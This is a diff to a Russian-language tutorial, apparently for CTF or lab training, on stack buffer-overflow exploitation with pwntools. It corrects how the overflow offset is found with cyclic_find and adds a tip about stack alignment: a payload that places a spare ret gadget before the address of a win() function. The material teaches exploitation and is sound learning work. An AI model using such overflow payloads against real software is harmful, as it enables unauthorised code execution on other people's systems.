@@ -14,7 +14,7 @@ from pwn import *
 cyclic_pattern = cyclic(200)
 # ... отправить его в программу, программа упадёт ...
 # в gdb/по дампу увидеть значение, попавшее в RSP/RIP, например 0x6161616c
-offset = cyclic_find(0x6161616c)     # pwntools посчитает смещение
+offset = cyclic_find(b'laaa')        # надёжнее искать по байтам: на 64 бит cyclic_find(число) бывает капризен
 print(offset)
 ```
 
@@ -43,6 +43,13 @@ io.interactive()                         # получаем вывод win() —
 
 ⚠️ Байты адреса непечатные — поэтому payload отправляют **скриптом**, а не руками. `p64()` из
 pwntools делает ровно `struct.pack("<Q", addr)`.
+
+💡 Если `win()` найден верно, но программа всё равно падает с SIGSEGV (часто на инструкции `movaps`
+внутри `printf`) — стек не выровнен по 16 байт. Добавь перед адресом `win` «пустой» гаджет `ret`:
+```python
+ret = 0x40101a                                # адрес инструкции ret (найти в objdump/ropper)
+payload = b"A"*offset + p64(ret) + p64(win)   # лишний ret выравнивает стек
+```
 
 ## 3. Format string — кратко
 
